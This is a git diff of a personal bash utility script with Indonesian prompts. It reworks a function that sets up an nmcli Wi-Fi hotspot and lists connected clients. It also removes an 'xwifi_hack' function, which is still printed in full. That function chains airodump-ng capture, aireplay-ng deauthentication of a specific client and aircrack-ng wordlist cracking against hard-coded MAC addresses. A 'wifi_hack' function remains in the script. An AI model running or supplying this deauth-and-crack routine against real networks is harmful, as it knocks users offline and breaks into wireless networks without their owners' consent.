@@ -595,24 +595,23 @@ function install_data() {
 
 function wifi() 
 {
-	read -p "[+] baru? y/n: " wi
+	read -p "[+] baru/lama/clien? y/l/c: " wi
 	if [ "$wi" = "y" ]; then
 		nmcli connection add type wifi ifname '*' con-name alice autoconnect no ssid "Server alice"
-    	nmcli connection modify alice 802-11-wireless.mode ap 802-11-wireless.band bg ipv4.method shared
-    	nmcli connection up alice
-    else
-    	nmcli connection up alice
-    fi
+		nmcli connection modify alice 802-11-wireless.mode ap 802-11-wireless.band bg ipv4.method shared
+		nmcli connection up alice
+	elif [ "$wi" = "c" ]; then
+		echo
+		echo_green_title "****** List now *****"
+		sudo arp -a
+		echo
+		echo "***** Name ******"
+		cat "/var/lib/misc/dnsmasq.leases"
+	else
+		nmcli connection up alice
+	fi
 }
 
-function xwifi_hack()
-{
-	xterm -e airodump-ng -c 1 --bssid 7C:8B:CA:B1:2F:12 -w `pwd`/tplink wlp9s0mon &
-	read -p "ENTER untuk kill client: "
-	xterm -e aireplay-ng --deauth 5 -a 7C:8B:CA:B1:2F:12 -c 7C:D6:61:93:94:F4 --ignore-negative-one wlp9s0mon &
-	read -p "ENTER untuk cracking (Handsake harus dapat): "
-	aircrack-ng -w integer.txt -b 7C:8B:CA:B1:2F:12 tplink-01.cap
-}
 function wifi_hack()
 {
 	echo
